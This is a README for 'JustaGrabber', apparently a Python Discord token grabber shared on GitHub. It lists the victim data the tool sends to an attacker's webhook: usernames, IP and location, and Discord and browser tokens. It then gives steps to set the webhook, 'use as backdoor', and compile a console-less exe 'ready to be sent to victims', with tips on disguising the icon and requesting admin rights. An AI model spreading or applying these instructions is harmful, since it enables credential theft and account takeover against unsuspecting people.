<h1 align="center">🎄 JustaGrabber - A discord token grabber written in python3<h1>
<h3 align="center">🎇 Made by kldiscord https://github.com/kldiscord<h3>

<h3 align="center">🌟 Please leave a star if you liked JustaGrabber<h3>

---

#### 🎁 Things will send to you when it grabs someting :
 -  Username, Computer name
 -  Ip, Country, City, Region, Postal, Location with Google Map
 -  Tokens (Discord, Other discord clients, Browsers)
 -  Will be added soon!
 
> 📷 Webhook screenshot

<p align="left"><img src="https://media.discordapp.net/attachments/853578499096707082/904282108074295356/unknown.png?width=1107&height=676"</p>

### ❗ About modules
JustaGrabber dosen't needs any other modules. 
Just need python 3's internal module! (os, re, json, urllib.request)
 
### 📁・ How to use
1. Download python 3 at [python.org](https://python.org). Must be 3.x.x
2. Open "JustaGrabber.py" with any code editor.
3. Replace Your webhook in line 3
4. Send the code or use as backdoor. Or convert to exe then give to others

### ⚙・How to compile .py to .exe
Type 
```
pip install pyinstaller
``` in cmd.
 
Open cmd in the directory that the JustaGrabber.py is in then type : 
```
pyinstaller --onefile --clean --noconsole main.py
```
replace main.py with the file name if you changed it
3 folders and 1 file will be created, you can delete them all except for the dist folder
go into the dist folder and there is your exe ready to be sent to victims!

### 💾・ More options
Add these into the command when creating the exe if you want

|    Pyinstaller Options 		|
| ------------------------------------ 	|
| `-n name` Name that the exe will have (default is the .py file)	|
| `-i icon.ico` Icon that the exe will have (do `-i NONE` for normal executable look)	|
| `--clean` Clean PyInstaller cache and remove temporary files before building	|
| `--uac-admin` Requests admin privileges upon running the exe |
| `--hidden-import MODULENAME` Name an import not visible in the code of the script. Can be used multiple times |
